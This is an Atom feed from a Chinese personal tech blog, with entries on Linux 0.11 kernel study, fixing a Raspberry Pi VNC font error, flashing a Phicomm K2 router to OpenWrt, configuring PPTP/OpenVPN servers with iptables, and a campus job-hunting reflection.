<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>rutk1t0r&#39;s blog</title>
  <subtitle>PGP 程序猿 攻城狮</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://embpgp.github.io/"/>
  <updated>2016-11-07T06:14:22.700Z</updated>
  <id>http://embpgp.github.io/</id>
  
  <author>
    <name>rutk1t0r</name>
    <email>pgp@rutk1t0r.cn</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux内核0.11完全注释 第一章</title>
    <link href="http://embpgp.github.io/2016/11/07/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
    <id>http://embpgp.github.io/2016/11/07/Linux内核0-11完全注释-第一章/</id>
    <published>2016-11-07T05:38:41.000Z</published>
    <updated>2016-11-07T06:14:22.700Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>一直学习Linux内核源码,现在有些时间了,便开始找本书籍开始.从最初的成形版本可以学到当时Linux内核开发者的思考方式,便于理解后期Linux的改进路线.</p>
</blockquote>
<hr>
<h1 id="Linux诞生和发展"><a href="#Linux诞生和发展" class="headerlink" title="Linux诞生和发展"></a>Linux诞生和发展</h1><p>Linux操作系统的诞生,发展和成长过程依赖于以下五个重要支柱:<br>UNIX操作系统:鼻祖<br>MINIX操作系统:DEMOE版本供学习<br>GNU计划:GNU’s not Unix,含编辑工具,shell程序,gcc系列编译程序,gdb调试程序等<br>POSIX标准:Linux的未来<br>Internet网络:传播的媒介</p>
<h1 id="主要版本号"><a href="#主要版本号" class="headerlink" title="主要版本号"></a>主要版本号</h1><p><img src="/images/kernel_release_1.png" alt="kernel_release_1"><br><img src="/images/kernel_release_2.png" alt="kernel_release_2"></p>
<h1 id="内核目录树"><a href="#内核目录树" class="headerlink" title="内核目录树"></a>内核目录树</h1><p><img src="/images/Linux_kernel_0.11.png" alt="Linux_kernel_0.11"></p>
<h1 id="书籍章节划分"><a href="#书籍章节划分" class="headerlink" title="书籍章节划分"></a>书籍章节划分</h1><p>书籍分为了5个部分,第1章至第4章是基础部分.操作系统与所运行的硬件环境密切相关(Intel的80X86保护模式下的编程原理,到目前位置Linus本人仍然认为X86系列的处理器比较适合Linux);<br>第二部分包括第5至第7章,描述内核引导启动和32位运行方式的准备阶段,作为学习内核的初学者应该全部进行阅读;<br>第三部分是从第8章到第13章是内核代码的主要部分;<br>第四部分是从14章到16章,作为第三部分的参考部分;<br>第五部分介绍如何使用PC模拟软件系统Bochs针对Linux 0.11内核进行各种实验活动.  </p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;一直学习Linux内核源码,现在有些时间了,便开始找本书籍开始.从最初的成形版本可以学到当时Linux内核开发者的思考方式,便于理解后期Linux的改进路线.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1 id=&quot;Linux诞生和发展&quot;&gt;&lt;
    
    </summary>
    
      <category term="study" scheme="http://embpgp.github.io/categories/study/"/>
    
    
      <category term="C/C++" scheme="http://embpgp.github.io/tags/C-C/"/>
    
      <category term="Linux kernel" scheme="http://embpgp.github.io/tags/Linux-kernel/"/>
    
      <category term="Asm" scheme="http://embpgp.github.io/tags/Asm/"/>
    
      <category term="LDD" scheme="http://embpgp.github.io/tags/LDD/"/>
    
  </entry>
  
  <entry>
    <title>raspberry pi xrdp error</title>
    <link href="http://embpgp.github.io/2016/11/07/raspberry-pi-xrdp-error/"/>
    <id>http://embpgp.github.io/2016/11/07/raspberry-pi-xrdp-error/</id>
    <published>2016-11-07T02:35:42.000Z</published>
    <updated>2016-11-07T03:07:25.364Z</updated>
    
    <content type="html"><![CDATA[<p>参考资料:<br><a href="http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver" target="_blank" rel="external">http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver</a></p>
<blockquote>
<p>关于树莓派的介绍以及使用可参考官方网站  </p>
</blockquote>
<h1 id="单板Linux"><a href="#单板Linux" class="headerlink" title="单板Linux"></a>单板Linux</h1><p>随着嵌入式Linux越来越流行,目前很多厂商都在致力于做单板主机,因此市面上也有很多产品可供选择.其中最具有活力的便是树莓派了,连在<strong>Mr Robot</strong>一剧中都被主人公拿来”打广告”.其他诸如香蕉派,香橙派,菠萝派等等pi都有开发团队在开发和维护,有兴趣的可以逐个折腾或者吊的自己绘制PCB制作.</p>
<h1 id="访问方式"><a href="#访问方式" class="headerlink" title="访问方式"></a>访问方式</h1><p>毫无疑问Web是目前最流行的可视化途径,但是在Linux中最最适合的还是属于console.一般默认在刷入固件之后会默认开启sshd服务,此时便可以通过网络接口ssh连接工具访问树莓派.当然,如果没有开启或者没有通过扫描等方式获取到树莓派的IP地址,则可以借助显示设备或者默认的串口来查看信息,可供选择的是显示接口为HDMI和专用显示接口,一般我们会用HDMI转VGA转接口来接显示屏,此后配置好后便可以当小型服务器用了.</p>
<h1 id="配置远程桌面"><a href="#配置远程桌面" class="headerlink" title="配置远程桌面"></a>配置远程桌面</h1><p>有些时候console解决不了的时候就必须启用rdp了.Linux中可供选择的桌面系统还是很多的,其中xfce作为流行的轻量级的桌面系统深受好评.一般我们仅仅需要开启xrdp服务即可采用微软的<strong>mstsc</strong>工具来连接Linux主机,但xrdp貌似也是在本地封装vnc服务,因此当vnc服务出现问题的时候即便3389端口处于监听状态也是没辙.无奈只好谷歌.报错信息如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">osmc@osmc:~$ vncserver </div><div class="line">Couldn<span class="string">'t start Xtightvnc; trying default font path.</span></div><div class="line">Please set correct fontPath in the vncserver script.</div><div class="line">Couldn't start Xtightvnc process.</div><div class="line"></div><div class="line">07/11/16 01:04:29 Xvnc version TightVNC-1.3.9</div><div class="line">07/11/16 01:04:29 Copyright (C) 2000-2007 TightVNC Group</div><div class="line">07/11/16 01:04:29 Copyright (C) 1999 AT&amp;T Laboratories Cambridge</div><div class="line">07/11/16 01:04:29 All Rights Reserved.</div><div class="line">07/11/16 01:04:29 See http://www.tightvnc.com/ <span class="keyword">for</span> information on TightVNC</div><div class="line">07/11/16 01:04:29 Desktop name <span class="string">'X'</span> (osmc:1)</div><div class="line">07/11/16 01:04:29 Protocol versions supported: 3.3, 3.7, 3.8, 3.7t, 3.8t</div><div class="line">07/11/16 01:04:29 Listening <span class="keyword">for</span> VNC connections on TCP port 5901</div><div class="line">Font directory <span class="string">'/usr/share/fonts/X11/misc/'</span> not found - ignoring</div><div class="line">Font directory <span class="string">'/usr/share/fonts/X11/Type1/'</span> not found - ignoring</div><div class="line">Font directory <span class="string">'/usr/share/fonts/X11/75dpi/'</span> not found - ignoring</div><div class="line">Font directory <span class="string">'/usr/share/fonts/X11/100dpi/'</span> not found - ignoring</div><div class="line"></div><div class="line">Fatal server error:</div><div class="line">could not open default font <span class="string">'fixed'</span></div><div class="line">07/11/16 01:04:30 Xvnc version TightVNC-1.3.9</div><div class="line">07/11/16 01:04:30 Copyright (C) 2000-2007 TightVNC Group</div><div class="line">07/11/16 01:04:30 Copyright (C) 1999 AT&amp;T Laboratories Cambridge</div><div class="line">07/11/16 01:04:30 All Rights Reserved.</div><div class="line">07/11/16 01:04:30 See http://www.tightvnc.com/ <span class="keyword">for</span> information on TightVNC</div><div class="line">07/11/16 01:04:30 Desktop name <span class="string">'X'</span> (osmc:1)</div><div class="line">07/11/16 01:04:30 Protocol versions supported: 3.3, 3.7, 3.8, 3.7t, 3.8t</div><div class="line">07/11/16 01:04:30 Listening <span class="keyword">for</span> VNC connections on TCP port 5901</div><div class="line">Font directory <span class="string">'/usr/share/fonts/X11/misc/'</span> not found - ignoring</div><div class="line">Font directory <span class="string">'/usr/share/fonts/X11/Speedo/'</span> not found - ignoring</div><div class="line">Font directory <span class="string">'/usr/share/fonts/X11/Type1/'</span> not found - ignoring</div><div class="line">Font directory <span class="string">'/usr/share/fonts/X11/75dpi/'</span> not found - ignoring</div><div class="line">Font directory <span class="string">'/usr/share/fonts/X11/100dpi/'</span> not found - ignoring</div><div class="line"></div><div class="line">Fatal server error:</div><div class="line">could not open default font <span class="string">'fixed'</span></div></pre></td></tr></table></figure></p>
<p>找了好几个论坛之后又装了好多貌似多余的东西,最后发现仅仅需在<a href="http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver" target="_blank" rel="external">这里</a>键入<code>sudo apt-get install  xfonts-base</code>即可解决字体问题了.   </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">osmc@osmc:~$ sudo vncserver </div><div class="line"></div><div class="line">New <span class="string">'X'</span> desktop is osmc:1</div><div class="line"></div><div class="line">Creating default startup script /root/.vnc/xstartup</div><div class="line">Starting applications specified <span class="keyword">in</span> /root/.vnc/xstartup</div><div class="line">Log file is /root/.vnc/osmc:1.log</div><div class="line"></div><div class="line">osmc@osmc:~$ netstat -anot</div><div class="line">Active Internet connections (servers and established)</div><div class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer</div><div class="line">tcp        0      0 0.0.0.0:5901            0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class="line">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class="line">tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class="line">tcp        0      0 0.0.0.0:6001            0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class="line">tcp        0      0 127.0.0.1:3350          0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class="line">tcp        0      0 0.0.0.0:1177            0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class="line">tcp        0      0 0.0.0.0:36666           0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class="line">tcp        0      0 0.0.0.0:3389            0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class="line">tcp        0    180 192.168.31.132:22       10.129.95.50:33532      ESTABLISHED on (0.21/0/0)</div><div class="line">tcp6       0      0 :::111                  :::*                    LISTEN      off (0.00/0/0)</div><div class="line">tcp6       0      0 :::8080                 :::*                    LISTEN      off (0.00/0/0)</div><div class="line">tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)</div><div class="line">tcp6       0      0 :::36666                :::*                    LISTEN      off (0.00/0/0)</div><div class="line">tcp6       0      0 :::36667                :::*                    LISTEN      off (0.00/0/0)</div><div class="line">tcp6       0      0 ::1:9090                :::*                    LISTEN      off (0.00/0/0)</div></pre></td></tr></table></figure>
<p>可以看到服务已经开启了,5901端口处于监听状态.再次<code>mstsc</code>之后发现error没了,问题解决.</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>遇到问题还是要有折腾的情怀,虽然还不知所以然,但是能够解决这个问题也不辜负<strong>搬砖</strong>的身份…为了不犯第二次错误,便记录下了本文.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考资料:&lt;br&gt;&lt;a href=&quot;http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver&quot; target=&quot;_blank&quot; rel=&quot;
    
    </summary>
    
      <category term="study" scheme="http://embpgp.github.io/categories/study/"/>
    
    
      <category term="Linux" scheme="http://embpgp.github.io/tags/Linux/"/>
    
      <category term="Configure" scheme="http://embpgp.github.io/tags/Configure/"/>
    
  </entry>
  
  <entry>
    <title>没这么好的&quot;馅饼&quot;</title>
    <link href="http://embpgp.github.io/2016/10/28/%E6%B2%A1%E8%BF%99%E4%B9%88%E5%A5%BD%E7%9A%84%E9%A6%85%E9%A5%BC/"/>
    <id>http://embpgp.github.io/2016/10/28/没这么好的馅饼/</id>
    <published>2016-10-28T06:23:07.000Z</published>
    <updated>2016-11-04T02:31:49.192Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>自己本来想买个路由器来着,想着几十块钱也是钱,一直到同学跟我说某东上有推销,而鹅厂的丘丘广告栏居然也有,抱着试了的心态购了一台斐讯K2.</p>
</blockquote>
<p>  参考资料:<br>  <a href="http://bbs.newifi.com/thread-3351-1-1.html" target="_blank" rel="external">http://bbs.newifi.com/thread-3351-1-1.html</a><br>  <a href="http://www.shaoit.com/feixunshuaji.html" target="_blank" rel="external">http://www.shaoit.com/feixunshuaji.html</a><br>  <a href="http://www.qqgzs.com/archives/k2-v22-148.html" target="_blank" rel="external">http://www.qqgzs.com/archives/k2-v22-148.html</a><br>  <a href="http://www.openwrt.org.cn/bbs/thread-60-1-1.html" target="_blank" rel="external">http://www.openwrt.org.cn/bbs/thread-60-1-1.html</a><br>  <a href="http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/" target="_blank" rel="external">http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/</a><br>  <a href="http://wiki.openwrt.org/zh-cn/doc/start" target="_blank" rel="external">OpenWrt官方文档:http://wiki.openwrt.org/zh-cn/doc/start</a></p>
<hr>
<h2 id="到货"><a href="#到货" class="headerlink" title="到货"></a>到货</h2><p>看起来很不错的样子,包装很漂亮.先不说返现的事情咯,根据基本的教程大概知道该路由器比一般的路由器功能还是丰富一些.从网上一查才知道居然带有<a href="http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/" target="_blank" rel="external">后门</a>,吓得我赶紧连开机都不试了就开始找各种固件.</p>
<h2 id="刷刷刷"><a href="#刷刷刷" class="headerlink" title="刷刷刷"></a>刷刷刷</h2><p>根据上述链接基本的一些教程一步一步来,首先知道了原生固件也阉割了很多功能(ssh和telnet服务被禁),估计也是为了加大一般发烧友DIY的难度.我猜测有很多路由器厂商做的路由器都有漏洞的,不管是无意的还是有意的硬编码的后门,还是用开源的东西安全一些,毕竟有社区在维护,当然自己也可以贡献力量.就如近期炒得很火热的米国一半的互联网企业遭受DDOS攻击致使互联网企业域名无法解析而瘫痪,研究称是祖国某几家生产监控设备的厂商的监控产品受到Mirai恶意软件(蠕虫)等的劫持和感染而加入了僵尸网络同时对米国各大互联网企业进行”测试”…为了安全,我决定还是刷<strong>OpenWrt</strong>.当然也有同学刷其他固件的,也不错.从<a href="http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/" target="_blank" rel="external">这里</a>提供的云盘链接下载的K2配置文件发现不能恢复,后来从<a href="http://www.qqgzs.com/archives/k2-v22-148.html" target="_blank" rel="external">这里</a>下载的配置文件就可以用了,当然,我也不能打包票地说breed没有问题,毕竟目前也还没有实力去逆向工程分析.只能选择信任网友们了.某些教程提供的一件刷机不知是否可行,我的不行,看URL应该是直接从另外一个URL Wget一个脚本到本地执行,但是我的居然报404错误…后来还是果断选择了先解决breed,而后再刷OpenWrt固件.<br><img src="/images/OpenWrt.png" alt="OpenWrt"></p>
<h2 id="测试玩玩"><a href="#测试玩玩" class="headerlink" title="测试玩玩"></a>测试玩玩</h2><p>关于OpenWrt在开源社区应该很知名,因此文档和使用手册也应该俱全.具体的可以多学习下高级用法和某些服务器的配置以及一些常见的开发.首先进入Web端设置好登录密码和root密码,同时使能ssh服务,把自己的公钥证书复制到相应的地方保存和应用.接下来通过PC的以太网口或者Wifi(保证先配置好)<code>ssh root@IP_Address</code>即可直接免密钥登录OpenWrt了,瞬间又找到了Linux的感觉,可以知道这里的shell是用的busybox,因为/bin/sh是busybox的一个软链接(其实/bin目录下绝大部分的命令都指向了busybox,足以见得它的强大),在嵌入式Linux中很常见.建议只允许从局域网中登录和管理,提高安全性.<br><img src="/images/OpenWrt_ssh.png" alt="OpenWrt_ssh"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>东西不是白送的,除了泄露个人理财信息之外技术上还进行了一些限制和”数据采集”,作为小白鼠也得Get一些技能来保护自己,实在不放心在一台中间设备开个tcpdump或者wireshark在WAN口一直监听即可测试.</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;自己本来想买个路由器来着,想着几十块钱也是钱,一直到同学跟我说某东上有推销,而鹅厂的丘丘广告栏居然也有,抱着试了的心态购了一台斐讯K2.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;  参考资料:&lt;br&gt;  &lt;a href=&quot;http://bbs.n
    
    </summary>
    
      <category term="study" scheme="http://embpgp.github.io/categories/study/"/>
    
    
      <category term="Configure" scheme="http://embpgp.github.io/tags/Configure/"/>
    
      <category term="network security" scheme="http://embpgp.github.io/tags/network-security/"/>
    
  </entry>
  
  <entry>
    <title>常用VPN服务器配置</title>
    <link href="http://embpgp.github.io/2016/10/27/%E5%B8%B8%E7%94%A8VPN%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
    <id>http://embpgp.github.io/2016/10/27/常用VPN服务器配置/</id>
    <published>2016-10-27T15:29:29.000Z</published>
    <updated>2016-11-04T02:31:01.364Z</updated>
    
    <content type="html"><![CDATA[<p>参考资料:<br><a href="https://www.nigesb.com/setup-your-own-vpn-with-pptp.html" target="_blank" rel="external">https://www.nigesb.com/setup-your-own-vpn-with-pptp.html</a><br><code>sudo apt-get install pptpd</code><br>编辑/etc/pptpd.conf<br><code>localip 10.0.0.1</code><br><code>remoteip 10.0.0.100-200</code></p>
<p>修改/etc/ppp/pptpd-options.pptpd</p>
<p><code>ms-dns 202.96.128.86</code><br><code>ms-dns 202.96.128.166</code></p>
<p>/etc/ppp/chap-secrets<br>次为：账号，协议，密码，ip地址。</p>
<p>编辑系统配置文件/etc/sysctl.conf</p>
<p><code>net.ipv4.ip_forward = 1</code></p>
<p><code>sysctl -p</code></p>
<p><code>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</code><br><code>iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356</code><br><code>iptables-save</code></p>
<p>系统环境：Debian-6 32-bit</p>
<p>iptables是即时生效的，所以无需重启，如果要停止iptables，请使用iptables -F命令，如果要iptables配置重启后仍然有效，请按如下操作步骤</p>
<p>1.创建/etc/iptables文件(文件名可以随意取)</p>
<p>2.创建/etc/network/if-pre-up.d/iptables文件，并给予其执行权限<br><code>root@hostname:~# touch /etc/network/if-pre-up.d/iptables</code><br><code>root@hostname:~# chmod +x /etc/network/if-pre-up.d/iptables</code></p>
<p>3.编辑/etc/network/if-pre-up.d/iptables文件，使其内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line"> /sbin/iptables-restore &lt; /etc/iptables</div></pre></td></tr></table></figure></p>
<p> 4.配置iptables，过程略，配置好iptables后，将配置保存到/etc/iptables文件中即可<br> root@hostname:~# iptables-save &gt; /etc/iptables</p>
<p> //配置openvpn<br> <a href="http://www.zhengyali.com/?p=52" target="_blank" rel="external">http://www.zhengyali.com/?p=52</a><br> <a href="http://www.zhengyali.com/?p=66" target="_blank" rel="external">http://www.zhengyali.com/?p=66</a><br> <a href="http://blog.csdn.net/brad_chen/article/details/49633491" target="_blank" rel="external">http://blog.csdn.net/brad_chen/article/details/49633491</a><br> <a href="http://openvpn.ustc.edu.cn/" target="_blank" rel="external">http://openvpn.ustc.edu.cn/</a></p>
<p> openvpn之树莓派问题</p>
<p> <code>sudo apt-get purge openvpn liblzo2-2</code><br> <code>sudo apt-get install openvpn</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考资料:&lt;br&gt;&lt;a href=&quot;https://www.nigesb.com/setup-your-own-vpn-with-pptp.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.nigesb.com/setup-y
    
    </summary>
    
      <category term="study" scheme="http://embpgp.github.io/categories/study/"/>
    
    
      <category term="Configure" scheme="http://embpgp.github.io/tags/Configure/"/>
    
      <category term="network security" scheme="http://embpgp.github.io/tags/network-security/"/>
    
  </entry>
  
  <entry>
    <title>求职艰辛路</title>
    <link href="http://embpgp.github.io/2016/10/17/job-summary/"/>
    <id>http://embpgp.github.io/2016/10/17/job-summary/</id>
    <published>2016-10-17T08:25:59.000Z</published>
    <updated>2016-11-04T02:35:28.261Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>经过一个多月的奋战,昨天终于签约了,个人也算结束了校招吧,一路走来,倍感心酸.</p>
</blockquote>
<p>老吴去年心得:<a href="http://www.nephen.com/2015/11/job-summary" target="_blank" rel="external">http://www.nephen.com/2015/11/job-summary</a></p>
<hr>
<h2 id="个人技术体系"><a href="#个人技术体系" class="headerlink" title="个人技术体系"></a>个人技术体系</h2><p>大学三年来主要的学习方向是嵌入式，编程语言主要为Asm,C/C++，用shell和python脚本开发过树莓派等的相关功能。操作系统平台为Linux,做过STM32,TI等芯片的开发，2015-2016学年在嵌入式创新基地主要学习四轴飞行器，目前开发平台为外国开源之王Pixhawk；在物联网实验室主要学习物联网作品相关技术体系，包括ZigBee，RFID，QT上位机等。对于信息安全、网络安全和软件安全亦有涉猎。</p>
<h3 id="为什么选择了嵌入式"><a href="#为什么选择了嵌入式" class="headerlink" title="为什么选择了嵌入式?"></a>为什么选择了嵌入式?</h3><p>个人对于计算机领域的起步较晚,高中及之前一直只会开关机等.大一恍恍惚惚地过了一年,基本没学啥,C和C++课程开得等于没学,数据结构和算法没好好听课….好在自己对于技术的热衷度不减,尤其是H4ck技术.大一的时候就买了<em>加密与解密</em>,<em>Windows PE权威指南</em>,<em>黑客大曝光</em>等,各种幻想,但是眼高手低,几乎看不懂里面的原理…,到大二开了数字电路的课程,瞬时间感觉底层在召唤我,所以在大二下结束的时候毅然决定加入嵌入式实验室学习.一进去直接上手stm32,买的正点原子的开发板,看着各个模块的介绍,照着提供的例程逐个地跑代码,修改代码,调试代码等.后期加入了四轴飞行器小组,担任软件组主攻手.到后来参与物联网实验室的建设,学习物联网相关技术,算是大致使得自己对整个计算机体系有了基本的认识.</p>
<h3 id="为什么涉猎安全技术"><a href="#为什么涉猎安全技术" class="headerlink" title="为什么涉猎安全技术?"></a>为什么涉猎安全技术?</h3><p>相信每个学习计算机的或多或少地对于H4ck3r有所耳闻或是冲着这个来的,但是到了大学发现实际情况并非如此.如果高校开的课程还算综合的话确实什么都会接触一点,但是都不能深入了解(谁说读大学就是学技术找工作的,详情搜索<strong>教育</strong>二字).因此如果有兴趣,你肯定会自己主动去索取相关资料的,这样学起来也是很快,当然要记得多动手.在今天这个信息化时代,安全问题已经成了普遍问题了,而非各个国家特殊组织所专有的.当然也不排除某些商业公司逆向工程竞争对手的产品来Get功能或者渗透测试对方信息系统达到某种目的.信息对抗及攻防延伸了到前所未有的高度,大型互联网公司脱裤,撞库事件层出不穷…随便去@n网搜一下,H3i产有多赚钱?未来安全产业估值不可限量,有兴趣的你还是好好学基础吧.</p>
<h3 id="为什么看起来有些xjbg"><a href="#为什么看起来有些xjbg" class="headerlink" title="为什么看起来有些xjbg"></a>为什么看起来有些xjbg</h3><p>据说计算机类相关专业考研的专业课包括<strong>数据结构</strong>,<strong>计算机组成原理</strong>,<strong>操作系统</strong>,<strong>计算机网络</strong>.我觉得挺合理的,这几门课程基本上能够概括计算机基本技术.有人会说,学那么多有用吗?企业到时候把人招进公司还不只是把一样做好就行了.现实可能是这样,但是作为一个计算机类相关专业的大学生,如果不懂原理,出了问题不知如何解决不会tm很尴尬吗?作为研究者就更加要有凡事都需要探索的精神.如果再给我一次机会重来大学的机会,我还是会贪婪地学习这么多,但是很会注重某个点.如果我架不起这个技术体系,我就会感到心虚(恨只恨起步太晚).对于面试官的问题<strong>你觉得你的优点和缺点是什么</strong>我就是实情这样回答的.因此我觉得,只要认真去搞过,那些东西都会是你的.</p>
<h2 id="如何校招"><a href="#如何校招" class="headerlink" title="如何校招?"></a>如何校招?</h2><p>首先概括:大三暑假最好去实习,或者提前批,9-10月份的校招很吃亏.都是有很鲜明的例子,具体原因可自行推理,当然类似于我们专业的神哥这样的人物除外咯.9-10月份是各大企业来校招的高峰期,期间可能会冲突很多,但是简历一定要投.模板可参考乔布,知页等(虽然泄露个人信息).内容可参考企业对相关岗位的要求照葫芦画瓢.校招来的企业可参考各大高校的就业网,最好去省会知名高校的官网看,或者直接去心仪的企业官网查看,以及各大就业网站(毕竟很多企业都是委托第三方来制作招聘网站的)等.用文字图表编辑工具记录下校招行程,包括宣讲会,笔试面试发放offer等流程的具体日期.不清楚的可以咨询自己的学长学姐,他们是过来人,不会坑你的,否则就是你请他们的饭只有一顿…</p>
<h2 id="笔试"><a href="#笔试" class="headerlink" title="笔试"></a>笔试</h2><p>关于技术岗和非技术岗的情况还是相差很远的.一般非技术岗位不需要笔试而直接进入群面环节.而技术岗一般会进行一轮笔试,内容几乎都是基础,当然也不排除大型公司提高难度.一定要把那些<strong>套路</strong>搞明白,笔试和面试都有<strong>套路</strong>.此处会省略很多字,因为在互联网上能够匹配到.把能够做的一定都做了,一般会结合笔试成绩和简历来决定是否进入下一轮环节.建议建立一个找工作的讨论组,每天发布新消息,讨论和总结相关试题等.毕竟赶场也不容易,可以多吃点儿了…</p>
<h2 id="面试"><a href="#面试" class="headerlink" title="面试"></a>面试</h2><p>笔试中不会做的题目考完之后一定要弄懂!!!这个坑不填几乎就可以直接See You Again了.一面的面试官一般还是喜欢问一些基础,比如<strong>指针和引用的异同</strong>,<strong>线程和进程的区别</strong>,<strong>#define用法</strong>,<strong>static,const用法</strong>,<strong>C++多态的实现方法</strong>,<strong>TCP时序图</strong>,<strong>各种排序,查找,遍历等的算法原理</strong>,<strong>网络编程中IO复用的情况</strong>等等,Linux的后台开发可以参考这个<a href="http://blog.csdn.net/huangjm_13/article/details/8799595" target="_blank" rel="external">链接</a>.搞熟了就会了.技术嘛,就是不断学习和应用的过程.二面一般是压力测试,讲一些自己做过的项目,怎么做的,怎么解决问题的等,可以搞一搞<strong>剑指offer</strong>和<strong>程序员面试宝典</strong>等书籍.在和面试官交流的过程可以稍微引导一下,体现出一个循序渐进的过程.在最后,一般面试官会说:<strong>“你有什么需要问我的吗?”</strong>,这个时候很重要,或<strong>削发明志</strong>,或<strong>力挽狂澜</strong>.一定不要傻乎乎地啥都不问就走了.所以有些技巧还是需要把握的,技术能力是一个很重要的因素,但是也要注意细节.可能某些企业不怎么想去,但是也可以去笔试面试,亲身收获面经,为更好的做准备.不打无准备的仗!!!</p>
<h2 id="HR约谈"><a href="#HR约谈" class="headerlink" title="HR约谈"></a>HR约谈</h2><p>一般过了两面就会跟人力资源的HR姐姐约谈待遇和薪水问题,某些企业都是明码标价的.我是觉得应届毕业生还是应该多关注行业和自己感兴趣的技术,不能太过于强求金子,当然食宿也得考虑.找到工作仅仅只是一个开始,后面还需要不断学习新的技术和沉淀,这么早确定自己的未来有意思不?</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感谢诸位背后的支持,在这段日子里一直有一群小伙伴一起为公共交通事业作出卓越贡献,大家能够抗住周围的压力并发挥出自己的实力,是一个成熟的过程.祝愿小伙伴们早日找到心仪的工作,继续加油!!!</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;经过一个多月的奋战,昨天终于签约了,个人也算结束了校招吧,一路走来,倍感心酸.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;老吴去年心得:&lt;a href=&quot;http://www.nephen.com/2015/11/job-summary&quot; targ
    
    </summary>
    
      <category term="misc" scheme="http://embpgp.github.io/categories/misc/"/>
    
    
      <category term="misc" scheme="http://embpgp.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>一起来撸printf吧</title>
    <link href="http://embpgp.github.io/2016/09/25/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%92%B8printf%E5%90%A7/"/>
    <id>http://embpgp.github.io/2016/09/25/一起来撸printf吧/</id>
    <published>2016-09-25T12:17:43.000Z</published>
